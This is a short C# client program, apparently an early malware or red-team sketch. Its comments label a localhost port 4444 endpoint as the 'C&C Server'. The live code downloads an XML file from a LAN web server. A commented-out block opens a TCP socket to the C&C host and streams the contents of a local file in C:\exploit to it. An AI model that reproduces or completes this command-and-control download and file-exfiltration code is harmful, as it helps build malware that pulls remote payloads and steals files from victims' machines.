using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Client
{
    public class tcpSend
    {
       
        private static void Main()
        {
            string HostName = "127.0.0.1"; //Address of C&C Server
            int prt = 4444; //Port od C&C Server

            WebClient web = new WebClient();

            try
            {
                web.DownloadFile("http://192.168.0.19:5555/MyFile.xml", "MyFile.xml");
            }
            catch
            {
                System.Console.WriteLine("Failed to Get File");
            }

            

            System.Console.WriteLine("Success");
            System.Console.ReadLine();

            //TcpClient tc = new TcpClient(HostName, prt);

            //NetworkStream ns = tc.GetStream();

            //FileStream fs = File.Open("C:\\exploit\\test.txt", FileMode.Open);

            //int data = fs.ReadByte();

            //while (data != -1)
            //{
              //  ns.WriteByte((byte)data);
                //data = fs.ReadByte();

//            }
  //          fs.Close();
    //        ns.Close();
      //      tc.Close();
       
            
        
        }
    }
}